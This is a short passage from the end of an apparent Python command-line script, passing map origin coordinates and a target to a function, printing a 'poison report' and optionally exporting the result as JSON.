        map_origin_x=args.map_origin_x, map_origin_y=args.map_origin_y,
        target=args.target,
    )
    print_poison_report(result)
    if args.output:
        export_json(result, args.output)
